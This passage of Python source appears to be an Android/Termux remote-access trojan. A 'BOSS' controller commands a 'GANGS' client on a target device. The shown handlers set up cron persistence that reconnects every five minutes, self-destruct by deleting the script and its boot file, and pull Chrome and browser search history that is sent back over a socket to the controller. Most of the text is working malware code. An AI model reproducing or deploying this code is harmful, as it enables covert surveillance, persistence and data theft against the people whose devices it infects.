                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not configure auto-start"
            
            elif data == 'persistent':
                try:
                    cmd = """
                    echo '*/5 * * * * python3 /data/data/com.termux/files/home/gangs.py' > /data/data/com.termux/files/home/cron.txt
                    crontab /data/data/com.termux/files/home/cron.txt 2>/dev/null
                    echo 'Persistence established (reconnects every 5 min)'
                    """
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not establish persistence"
            
            elif data == 'selfdestruct':
                try:
                    cmd = """
                    rm -rf /data/data/com.termux/files/home/gangs.py
                    rm -rf /data/data/com.termux/files/home/.termux/boot/start.sh
                    echo 'Self-destruct completed'
                    """
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                    client.close()
                    sys.exit(0)
                except:
                    output = b"Self-destruct failed"
            
            elif data == 'search_history':
                try:
                    cmd = """
                    echo "=== Recent Search History ==="
                    cat /data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null | strings | grep -E "google|youtube" | head -10
                    echo ""
                    echo "=== Browser History ==="
                    cat /data/data/com.android.browser/databases/browser2.db 2>/dev/null | strings | grep -E "google|youtube" | head -10
                    """
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not retrieve search history"
            
            else:
                output = b"Unknown instruction"
            
        except socket.timeout:
            print(f"{YELLOW}[!] Command timeout. Reconnecting...{RESET}")
            continue
        except socket.error as e:
            print(f"{RED}[-] Socket error: {e}{RESET}")
            break
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")
            output = f"Error: {str(e)}".encode()
            
        try:
            if output:
                client.send(output)
            else:
                client.send(b"Command executed")
        except Exception as send_err:
            print(f"{RED}[-] Send error: {send_err}{RESET}")
            break
        
    try:
        client.close()
    except:
        pass
    print(f"{RED}[*] Disconnected from BOSS{RESET}")

def main():
    show_banner()
    lock_and_redirect()
    
    print(f"\n{YELLOW}╔════════════════════════════════════════╗{RESET}")
    print(f"{YELLOW}║     {TOOL_NAME} CONTROL SYSTEM       ║{RESET}")
    print(f"{YELLOW}╚════════════════════════════════════════╝{RESET}")
    print(f"\n{YELLOW}[1]{RESET} {TOOL_NAME} (Server - Remote Controller)")
    print(f"{YELLOW}[2]{RESET} GANGS (Client - Target Device)")
    print(f"{YELLOW}[3]{RESET} Exit")
    
    choice = input(f"\n{BOLD}{YELLOW}> {RESET}").strip()
    
    if choice == '1':
        BOSS()
    elif choice == '2':
        GANGS()
    elif choice == '3':
        print(f"{RED}Exiting...{RESET}")
        sys.exit(0)
    else:
        print(f"{RED}Invalid choice!{RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
